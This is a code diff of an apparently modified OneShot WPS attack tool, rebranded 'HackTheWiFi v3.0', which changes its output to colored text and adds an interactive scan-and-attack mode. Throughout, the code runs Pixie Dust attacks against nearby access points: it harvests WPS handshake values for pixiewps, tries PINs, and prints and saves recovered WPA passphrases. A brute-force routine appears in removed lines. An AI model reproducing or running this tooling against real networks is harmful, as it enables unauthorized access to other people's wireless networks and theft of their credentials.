-                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+                    print(f'{Colors.CYAN}[P] E-Nonce: {self.pixie_creds.e_nonce}{Colors.RESET}')
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 assert(len(self.pixie_creds.pkr) == 192*2)
                 if pixiemode:
-                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+                    print(f'{Colors.CYAN}[P] PKR: {self.pixie_creds.pkr}{Colors.RESET}')
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 assert(len(self.pixie_creds.pke) == 192*2)
                 if pixiemode:
-                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
+                    print(f'{Colors.CYAN}[P] PKE: {self.pixie_creds.pke}{Colors.RESET}')
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 assert(len(self.pixie_creds.authkey) == 32*2)
                 if pixiemode:
-                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
+                    print(f'{Colors.CYAN}[P] AuthKey: {self.pixie_creds.authkey}{Colors.RESET}')
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash1) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+                    print(f'{Colors.CYAN}[P] E-Hash1: {self.pixie_creds.e_hash1}{Colors.RESET}')
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash2) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+                    print(f'{Colors.CYAN}[P] E-Hash2: {self.pixie_creds.e_hash2}{Colors.RESET}')
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
-        elif ': State: ' in line:
-            if '-> SCANNING' in line:
-                self.connection_status.status = 'scanning'
-                self.__print_with_indicators('*', 'Scanning…')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
-            print('[-] wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+            print(f'{Colors.RED}[-] wpa_supplicant returned WPS-FAIL{Colors.RESET}')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            self.__print_with_indicators('*', 'Authenticating…')
+            print(f'{Colors.DIM}[*] Authenticating…{Colors.RESET}')
         elif 'Authentication response' in line:
-            self.__print_with_indicators('*', 'Authenticated')
-        elif 'Trying to associate with' in line:
-            self.connection_status.status = 'associating'
-            if 'SSID' in line:
-                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            self.__print_with_indicators('*', 'Associating with AP…')
-        elif ('Associated with' in line) and (self.interface in line):
-            bssid = line.split()[-1].upper()
-            if self.connection_status.essid:
-                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
-            else:
-                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
+            print(f'{Colors.GREEN}[+] Authenticated{Colors.RESET}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            self.__print_with_indicators('*', 'Sending EAPOL Start…')
+            print(f'{Colors.DIM}[*] Sending EAPOL Start…{Colors.RESET}')
         elif 'EAP entering state IDENTITY' in line:
-            self.__print_with_indicators('*', 'Received Identity Request')
+            print(f'{Colors.DIM}[*] Received Identity Request{Colors.RESET}')
         elif 'using real identity' in line:
-            self.__print_with_indicators('*', 'Sending Identity Response…')
-        elif self.bssid in line and 'level=' in line:
-            self.lastPwr = line.split("level=")[1].split(" ")[0]
+            print(f'{Colors.DIM}[*] Sending Identity Response…{Colors.RESET}')
         elif pbc_mode and ('selected BSS ' in line):
             bssid = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bssid
-            print('[*] Selected AP: {}'.format(bssid))
-        elif bssid in line and 'level=' in line:
-            signal = line.split("level=")[1].split(" ")[0]
-            if 'noise=' in line:
-                noise = line.split("noise=")[1].split(" ")[0]
-                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
-            else:
-                print ("[i] Current signal: {}".format(signal))
+            print(f'{Colors.DIM}[*] Selected AP: {bssid}{Colors.RESET}')
 
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        self.__print_with_indicators('*', 'Running Pixiewps…')
+        print(f"{Colors.DIM}[*] Running Pixiewps…{Colors.RESET}")
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
             print(cmd)
@@ -1316,9 +1156,9 @@ class Companion:
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[+] WPS PIN: '{wps_pin}'")
-        print(f"[+] WPA PSK: '{wpa_psk}'")
-        print(f"[+] AP SSID: '{essid}'")
+        print(f"{Colors.GREEN}[+] WPS PIN: '{wps_pin}'{Colors.RESET}")
+        print(f"{Colors.GREEN}[+] WPA PSK: '{wpa_psk}'{Colors.RESET}")
+        print(f"{Colors.GREEN}[+] AP SSID: '{essid}'{Colors.RESET}")
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
@@ -1336,18 +1176,18 @@ class Companion:
             if writeTableHeader:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+        print(f'{Colors.GREEN}[i] Credentials saved to {filename}.txt, {filename}.csv{Colors.RESET}')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
             file.write(pin)
-        print('[i] PIN saved in {}'.format(filename))
+        print(f'{Colors.GREEN}[i] PIN saved in {filename}{Colors.RESET}')
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         if len(pins) > 1:
-            print(f'PINs generated for {bssid}:')
+            print(f'{Colors.CYAN}PINs generated for {bssid}:{Colors.RESET}')
             print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
             for i, pin in enumerate(pins):
                 number = '{})'.format(i + 1)
@@ -1367,7 +1207,7 @@ class Companion:
                     break
         elif len(pins) == 1:
             pin = pins[0]
-            print('[i] The only probable PIN is selected:', pin['name'])
+            print(f'{Colors.DIM}[i] The only probable PIN is selected: {pin["name"]}{Colors.RESET}')
             pin = pin['pin']
         else:
             return None
@@ -1376,20 +1216,28 @@ class Companion:
     def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
+        
+        self.connection_status.assoc_count = 0
+        self.connection_status.scan_loop_count = 0
+        self.connection_status.last_state = None
+        self.should_skip = False
+        self.skip_bssid = None
+        
         self.pixie_creds.clear()
         self.connection_status.clear()
-        self.wpas.stdout.read(300)   # Clean the pipe
+        self.wpas.stdout.read(300)
+        
         if pbc_mode:
             if bssid:
-                print(f"[*] Starting WPS push button connection to {bssid}…")
+                print(f"{Colors.DIM}[*] Starting WPS push button connection to {bssid}…{Colors.RESET}")
                 cmd = f'WPS_PBC {bssid}'
             else:
-                print("[*] Starting WPS push button connection…")
+                print(f"{Colors.DIM}[*] Starting WPS push button connection…{Colors.RESET}")
                 cmd = 'WPS_PBC'
         else:
-            print(f"[*] Trying PIN '{pin}'…")
+            print(f"{Colors.DIM}[*] Trying PIN '{pin}'…{Colors.RESET}")
             cmd = f'WPS_REG {bssid} {pin}'
-
+        
         r = self.sendAndReceive(cmd)
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
@@ -1397,8 +1245,12 @@ class Companion:
             return False
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
+            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
             if not res:
+                break
+            if self.should_skip:
+                print(f'{Colors.YELLOW}[!] Skipping target {bssid}{Colors.RESET}')
+                self.connection_status.status = 'SKIPPED'
                 break
             if self.connection_status.status == 'WSC_NACK':
                 break
@@ -1410,24 +1262,23 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, 
+                          showpixiecmd=False, pixieforce=False, store_pin_on_fail=False):
         if not pin:
             if pixiemode:
                 try:
-                    # Try using the previously calculated PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                        if input(f'{Colors.YELLOW}[?] Use previously calculated PIN {t_pin}? [n/Y] {Colors.RESET}').lower() != 'n':
                             pin = t_pin
                         else:
                             raise FileNotFoundError
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
-                # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
+        
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=pbc_mode)
             bssid = self.connection_status.bssid
@@ -1442,12 +1293,14 @@ class Companion:
         else:
             self.__wps_connection(bssid, pin, pixiemode)
 
+        if self.connection_status.status == 'SKIPPED':
+            return False
+
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
-                # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 try:
                     os.remove(filename)
@@ -1461,95 +1314,12 @@ class Companion:
                     return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
-                print('[!] Not enough data to run Pixie Dust attack')
+                print(f'{Colors.RED}[!] Not enough data to run Pixie Dust attack{Colors.RESET}')
                 return False
         else:
             if store_pin_on_fail:
-                # Saving Pixiewps calculated PIN if can't connect
                 self.__savePin(bssid, pin)
             return False
-
-    def __first_half_bruteforce(self, bssid, f_half, delay=None):
-        """
-        @f_half — 4-character string
-        """
-        checksum = self.generator.checksum
-        while int(f_half) < 10000:
-            t = int(f_half + '000')
-            pin = '{}000{}'.format(f_half, checksum(t))
-            self.single_connection(bssid, pin)
-            if self.connection_status.isFirstHalfValid():
-                print('[+] First half found')
-                return f_half
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
-                return self.__first_half_bruteforce(bssid, f_half)
-            f_half = str(int(f_half) + 1).zfill(4)
-            self.bruteforce.registerAttempt(f_half)
-            if delay:
-                time.sleep(delay)
-        print('[-] First half not found')
-        return False
-
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-        """
-        @f_half — 4-character string
-        @s_half — 3-character string
-        """
-        checksum = self.generator.checksum
-        while int(s_half) < 1000:
-            t = int(f_half + s_half)
-            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
-            self.single_connection(bssid, pin)
-            if self.connection_status.last_m_message > 6:
-                return pin
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
-            s_half = str(int(s_half) + 1).zfill(3)
-            self.bruteforce.registerAttempt(f_half + s_half)
-            if delay:
-                time.sleep(delay)
-        return False
-
-    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-        if (not start_pin) or (len(start_pin) < 4):
-            # Trying to restore previous session
-            try:
-                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                with open(filename, 'r') as file:
-                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
-                        mask = file.readline().strip()
-                    else:
-                        raise FileNotFoundError
-            except FileNotFoundError:
-                mask = '0000'
-        else:
-            mask = start_pin[:7]
-
-        try:
-            self.bruteforce = BruteforceStatus()
-            self.bruteforce.mask = mask
-            if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
-                if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
-            elif len(mask) == 7:
-                f_half = mask[:4]
-                s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            print("\nAborting…")
-            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            with open(filename, 'w') as file:
-                file.write(self.bruteforce.mask)
-            print('[i] Session saved in {}'.format(filename))
-            if args.loop:
-                raise KeyboardInterrupt
-
-    def __print_with_indicators(self, level, msg):
-        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
 
     def cleanup(self):
         self.retsock.close()
@@ -1559,15 +1329,11 @@ class Companion:
         os.remove(self.tempconf)
 
     def __del__(self):
-        #self.cleanup()
-        try:
-            self.cleanup()
-        except (ImportError, AttributeError, TypeError):
-            pass
+        self.cleanup()
 
 
 class WiFiScanner:
-    """docstring for WiFiScanner"""
+    """WiFi scanner with WPS detection and color coding"""
     def __init__(self, interface, vuln_list=None):
         self.interface = interface
         self.vuln_list = vuln_list
@@ -1576,32 +1342,96 @@ class WiFiScanner:
         try:
             with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                 csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
-                # Skip header
                 next(csvReader)
                 self.stored = []
                 for row in csvReader:
-                    self.stored.append(
-                        (
-                            row[1],   # BSSID
-                            row[2]    # ESSID
-                        )
-                    )
+                    self.stored.append((row[1], row[2]))
         except FileNotFoundError:
             self.stored = []
 
+    def is_vulnerable(self, bssid):
+        """Check if BSSID is in vulnerable list"""
+        if not self.vuln_list:
+            return False
+        bssid_prefix = bssid.replace(':', '').upper()[:6]
+        for vuln in self.vuln_list:
+            if vuln.upper() in bssid_prefix or vuln.upper() == bssid_prefix:
+                return True
+        return False
+
+    def is_stored(self, bssid, essid):
+        """Check if network is already stored"""
+        for stored_bssid, stored_essid in self.stored:
+            if stored_bssid.upper() == bssid.upper():
+                return True
+        return False
+
+    def prompt_network(self):
+        """Prompt user to select a network from scan results with color coding"""
+        networks = self.iw_scanner()
+        if not networks:
+            print(f'{Colors.RED}[-] No WPS-enabled networks found{Colors.RESET}')
+            return None
+        
+        # Print header
+        print(f'{Colors.CYAN}{Colors.BOLD}Network marks: {Colors.LIGHT_GREEN}Possibly vulnerable{Colors.RESET} | '
+              f'{Colors.LIGHT_RED}WPS locked{Colors.RESET} | '
+              f'{Colors.GRAY}Already stored{Colors.RESET}')
+        print()
+        
+        print(f'{Colors.BOLD}{Colors.UNDERLINE}Networks list:{Colors.RESET}')
+        print(f'{"#":<3} {"BSSID":<18} {"ESSID":<25} {"Sec.":<10} {"PWR":<6} {"WSC device name":<25} {"WSC model":<20}')
+        print('-' * 110)
+        
+        for n, network in networks.items():
+            bssid = network['BSSID']
+            essid = network['ESSID']
+            security = network['Security type']
+            signal = network['Level']
+            wps_locked = network['WPS locked']
+            device_name = network.get('Device name', '')[:24]
+            model = network.get('Model', '')[:19]
+            
+            # Determine color coding
+            marker = ''
+            color = Colors.WHITE
+            
+            if self.is_vulnerable(bssid):
+                marker = f'{Colors.LIGHT_GREEN}●{Colors.RESET} '
+                color = Colors.LIGHT_GREEN
+            elif wps_locked:
+                marker = f'{Colors.LIGHT_RED}●{Colors.RESET} '
+                color = Colors.LIGHT_RED
+            elif self.is_stored(bssid, essid):
+                marker = f'{Colors.GRAY}●{Colors.RESET} '
+                color = Colors.GRAY
+            
+            print(f'{color}{n:<3} {bssid:<18} {essid[:24]:<25} {security:<10} {signal}dBm  {device_name:<25} {model:<20}{Colors.RESET}')
+        
+        print()
+        while True:
+            try:
+                choice = input(f'{Colors.CYAN}Select target number (or q to quit): {Colors.RESET}')
+                if choice.lower() == 'q':
+                    return None
+                num = int(choice)
+                if num in networks:
+                    return networks[num]['BSSID']
+                else:
+                    print(f'{Colors.RED}Invalid selection{Colors.RESET}')
+            except ValueError:
+                print(f'{Colors.RED}Enter a number or q to quit{Colors.RESET}')
+
     def iw_scanner(self) -> Dict[int, dict]:
-        """Parsing iw scan results"""
         def handle_network(line, result, networks):
-            networks.append(
-                    {
-                        'Security type': 'Unknown',
-                        'WPS': False,
-                        'WPS locked': False,
-                        'Model': '',
-                        'Model number': '',
-                        'Device name': ''
-                     }
-                )
+            networks.append({
+                'Security type': 'Unknown',
+                'WPS': False,
+                'WPS locked': False,
+                'Model': '',
+                'Model number': '',
+                'Device name': ''
+            })
             networks[-1]['BSSID'] = result.group(1).upper()
 
         def handle_essid(line, result, networks):
@@ -1672,7 +1502,7 @@ class WiFiScanner:
 
         for line in lines:
             if line.startswith('command failed:'):
-                print('[!] Error:', line)
+                print(f'{Colors.RED}[!] Error: {line}{Colors.RESET}')
                 return False
             line = line.strip('\t')
             for regexp, handler in matchers.items():
@@ -1680,163 +1510,13 @@ class WiFiScanner:
                 if res:
                     handler(line, res, networks)
 
-        # Filtering non-WPS networks
         networks = list(filter(lambda x: bool(x['WPS']), networks))
         if not networks:
             return False
 
-        # Sorting by signal level
         networks.sort(key=lambda x: x['Level'], reverse=True)
-
-        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
         network_list = {(i + 1): network for i, network in enumerate(networks)}
-
-        # Printing scanning results as table
-        def truncateStr(s, length, postfix="…"):
-            """
-            Truncate strings according to display width (supports Full and half width characters)
-            :param s: input string
-            :param length: Maximum display width (unit: column)
-            :param postfix: Truncate suffixes (such as ellipses)
-            """
-            # Calculate the original display width
-            original_width = wcwidth.wcswidth(s)
-            
-            # Scenario 1: The original width is exactly the same or smaller
-            if original_width <= length:
-                # Calculate the number of spaces to be filled (by display width)
-                padding_needed = length - original_width
-                # Allocate spaces evenly to the right of the string
-                return s + ' ' * padding_needed
-            
-            # Scenario 2: Truncation is required
-            postfix_width = wcwidth.wcswidth(postfix)
-            max_allowed = length - postfix_width
-            
-            current_width = 0
-            truncated = []
-            for c in s:
-                char_width = wcwidth.wcswidth(c)
-                if current_width + char_width > max_allowed:
-                    break
-                truncated.append(c)
-                current_width += char_width
-            
-            # Construct basic results
-            result = "".join(truncated)
-            if len(truncated) < len(s):
-                result += postfix
-            
-            # Accurately adjust the display width
-            result_width = wcwidth.wcswidth(result)
-            if result_width > length:
-                # Remove pre truncation restrictions and switch to more precise truncation
-                # Emergency cutoff (to prevent exceeding the limit)
-                # Change to character by character processing to ensure not exceeding the limit
-                current_width = 0
-                safe_truncated = []
-                for c in result:
-                    char_width = wcwidth.wcswidth(c)
-                    if current_width + char_width > length:
-                        break
-                    safe_truncated.append(c)
-                    current_width += char_width
-                safe_result = "".join(safe_truncated)
-                # If the truncated string becomes shorter, add ellipsis
-                if len(safe_result) < len(result):
-                    safe_result += postfix
-                    # Recheck the width
-                    if wcwidth.wcswidth(safe_result) > length:
-                        # If the limit is still exceeded after adding ellipsis, remove the ellipsis
-                        safe_result = safe_result[:-1]
-                return safe_result
-            
-            # Fill in exact spaces
-            padding_needed = length - result_width
-            return result + ' ' * padding_needed
-
-        def colored(text, color=None):
-            """Returns colored text"""
-            if color:
-                if color == 'green':
-                    text = '\033[92m{}\033[00m'.format(text)
-                elif color == 'red':
-                    text = '\033[91m{}\033[00m'.format(text)
-                elif color == 'yellow':
-                    text = '\033[93m{}\033[00m'.format(text)
-                else:
-                    return text
-            else:
-                return text
-            return text
-
-        if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
-                '|',
-                colored('Possibly vulnerable', color='green'),
-                colored('WPS locked', color='red'),
-                colored('Already stored', color='yellow')
-            ))
-        print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
-
-        network_list_items = list(network_list.items())
-        if args.reverse_scan:
-            network_list_items = network_list_items[::-1]
-        for n, network in network_list_items:
-            number = f'{n})'
-            model = '{} {}'.format(network['Model'], network['Model number'])
-            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
-            deviceName = truncateStr(network['Device name'], 27)
-    
-            # Processing the display width of other fields
-            processed_number = truncateStr(number, 4)
-            processed_bssid = truncateStr(network['BSSID'], 18)
-            processed_security = truncateStr(network['Security type'], 8)
-            processed_level = truncateStr(str(network['Level']), 4)
-            processed_device = deviceName  # 27 columns of width have been processed
-            processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
-            
-            # Directly concatenate the processed fields, separated by spaces in the middle
-            line_parts = [
-                processed_number,
-                processed_bssid,
-                essid,
-                processed_security,
-                processed_level,
-                processed_device,
-                processed_model
-            ]
-            line = ' '.join(line_parts)
-            
-            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
-                print(colored(line, color='yellow'))
-            elif network['WPS locked']:
-                print(colored(line, color='red'))
-            elif self.vuln_list and (model in self.vuln_list):
-                print(colored(line, color='green'))
-            else:
-                print(line)
-
         return network_list
-
-    def prompt_network(self) -> str:
-        networks = self.iw_scanner()
-        if not networks:
-            print('[-] No WPS networks found.')
-            return
-        while 1:
-            try:
-                networkNo = input('Select target (press Enter to refresh): ')
-                if networkNo.lower() in ('r', '0', ''):
-                    return self.prompt_network()
-                elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
-                else:
-                    raise IndexError
-            except Exception:
-                print('Invalid number')
 
 
 def ifaceUp(iface, down=False):
@@ -1846,3070 +1526,614 @@ def ifaceUp(iface, down=False):
         action = 'up'
     cmd = 'ip link set {} {}'.format(iface, action)
     res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
-    if res.returncode == 0:
-        return True
-    else:
-        return False
+    return res.returncode == 0
 
 
 def die(msg):
-    sys.stderr.write(msg + '\n')
+    sys.stderr.write(f'{Colors.RED}{msg}{Colors.RESET}\n')
     sys.exit(1)
 
 
-def usage():
-    return """
-OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
-
-%(prog)s <arguments>
-
-Required arguments:
-    -i, --interface=<wlan0>  : Name of the interface to use
-
-Optional arguments:
-    -b, --bssid=<mac>        : BSSID of the target AP
-    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
-    -K, --pixie-dust         : Run Pixie Dust attack
-    -B, --bruteforce         : Run online bruteforce attack
-    --push-button-connect    : Run WPS push button connection
-
-Advanced arguments:
-    -d, --delay=<n>          : Set the delay between pin attempts [0]
-    -w, --write              : Write AP credentials to the file on success
-    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
-    -X, --show-pixie-cmd     : Always print Pixiewps command
-    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
-    --iface-down             : Down network interface when the work is finished
-    -l, --loop               : Run in a loop
-    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
-    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
-    -v, --verbose            : Verbose output
-
-Example:
-    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
-"""
+def get_wireless_interface():
+    """Auto-detect wireless interface"""
+    try:
+        interfaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'eth0', 'mon0']
+        for iface in interfaces:
+            if os.path.exists(f'/sys/class/net/{iface}'):
+                return iface
+        
+        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
+        lines = result.stdout.split('\n')
+        for line in lines:
+            if 'Interface' in line:
+                parts = line.split()
+                if len(parts) > 1:
+                    return parts[1]
+        return None
+    except:
+        return None
 
 
-if __name__ == '__main__':
-    import argparse
+def print_header():
+    """Print the interactive mode header"""
+    width = 70
+    print(f'{Colors.CYAN}{"═" * width}{Colors.RESET}')
+    print(f'{Colors.CYAN}{Colors.BOLD}{"  HackTheWiFi v3.0 — INTERACTIVE MODE  ".center(width)}{Colors.RESET}')
+    print(f'{Colors.CYAN}{"═" * width}{Colors.RESET}')
+    print(f'{Colors.DIM}  Designed by SYLHETYHACKVENGER (THE-ERROR808){Colors.RESET}')
+    print(f'{Colors.DIM}  Mode: Pixie Dust + Force + Loop ( -K -F -l ){Colors.RESET}')
+    print(f'{Colors.CYAN}{"═" * width}{Colors.RESET}')
+    print()
 
-    # Show the beautiful banner first
-    show_banner()
 
-    parser = argparse.ArgumentParser(
-        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
-        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
-        )
+def print_footer():
+    """Print the interactive mode footer"""
+    width = 70
+    print()
+    print(f'{Colors.CYAN}{"═" * width}{Colors.RESET}')
+    print(f'{Colors.CYAN}{"  Thank you for using ALL-IN-ONE WPS ATTACK v3.0  ".center(width)}{Colors.RESET}')
+    print(f'{Colors.CYAN}{"  Exiting interactive mode...  ".center(width)}{Colors.RESET}')
+    print(f'{Colors.CYAN}{"═" * width}{Colors.RESET}')
+    print(f'{Colors.DIM}{"  Designed by SYLHETYHACKVENGER (THE-ERROR808)".center(width)}{Colors.RESET}')
+    print()
 
-    parser.add_argument(
-        '-i', '--interface',
-        type=str,
-        required=True,
-        help='Name of the interface to use'
-        )
-    parser.add_argument(
-        '-b', '--bssid',
-        type=str,
-        help='BSSID of the target AP'
-        )
-    parser.add_argument(
-        '-p', '--pin',
-        type=str,
-        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
-        )
-    parser.add_argument(
-        '-K', '--pixie-dust',
-        action='store_true',
-        help='Run Pixie Dust attack'
-        )
-    parser.add_argument(
-        '-F', '--pixie-force',
-        action='store_true',
-        help='Run Pixiewps with --force option (bruteforce full range)'
-        )
-    parser.add_argument(
-        '-X', '--show-pixie-cmd',
-        action='store_true',
-        help='Always print Pixiewps command'
-        )
-    parser.add_argument(
-        '-B', '--bruteforce',
-        action='store_true',
-        help='Run online bruteforce attack'
-        )
-    parser.add_argument(
-        '--pbc', '--push-button-connect',
-        action='store_true',
-        help='Run WPS push button connection'
-        )
-    parser.add_argument(
-        '-d', '--delay',
-        type=float,
-        help='Set the delay between pin attempts'
-        )
-    parser.add_argument(
-        '-w', '--write',
-        action='store_true',
-        help='Write credentials to the file on success'
-        )
-    parser.add_argument(
-        '--iface-down',
-        action='store_true',
-        help='Down network interface when the work is finished'
-        )
-    parser.add_argument(
-        '--vuln-list',
-        type=str,
-        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
-        help='Use custom file with vulnerable devices list'
-    )
-    parser.add_argument(
-        '-l', '--loop',
-        action='store_true',
-        help='Run in a loop'
-    )
-    parser.add_argument(
-        '-r', '--reverse-scan',
-        action='store_true',
-        help='Reverse order of networks in the list of networks. Useful on small displays'
-    )
-    parser.add_argument(
-        '--mtk-wifi',
-        action='store_true',
-        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
-             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
-             'Turn off Wi-Fi in the system settings before using this.'
-    )
-    parser.add_argument(
-        '-v', '--verbose',
-        action='store_true',
-        help='Verbose output'
-        )
 
-    args = parser.parse_args()
-
-    if sys.hexversion < 0x03060F0:
-        die("The program requires Python 3.6 and above")
-    if os.getuid() != 0:
-        die("Run it as root")
-
-    if args.mtk_wifi:
-        wmtWifi_device = Path("/dev/wmtWifi")
-        if not wmtWifi_device.is_char_device():
-            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
-                "/dev/wmtWifi does not exist or it is not a character device")
-        wmtWifi_device.chmod(0o644)
-        wmtWifi_device.write_text("1")
-
-    if not ifaceUp(args.interface):
-        die('Unable to up interface "{}"'.format(args.interface))
-
+def enter_interactive_mode(interface, save_result=False):
+    """Enter interactive mode with colorful interface"""
+    print_header()
+    
+    class Args:
+        def __init__(self):
+            self.interface = interface
+            self.bssid = None
+            self.pin = None
+            self.pixie_dust = True
+            self.pixie_force = True
+            self.show_pixie_cmd = False
+            self.bruteforce = False
+            self.pbc = False
+            self.delay = None
+            self.write = save_result
+            self.iface_down = False
+            self.vuln_list = '/data/data/com.termux/files/usr/share/oneshot/vulnwsc.txt'
+            self.loop = True
+            self.reverse_scan = False
+            self.mtk_wifi = False
+            self.verbose = False
+    
+    args = Args()
+    
+    try:
+        with open(args.vuln_list, 'r', encoding='utf-8') as file:
+            vuln_list = file.read().splitlines()
+    except FileNotFoundError:
+        vuln_list = []
+    
     while True:
         try:
+            print(f'{Colors.DIM}[*] BSSID not specified — scanning for available networks{Colors.RESET}')
+            scanner = WiFiScanner(args.interface, vuln_list)
+            bssid = scanner.prompt_network()
+            
+            if not bssid:
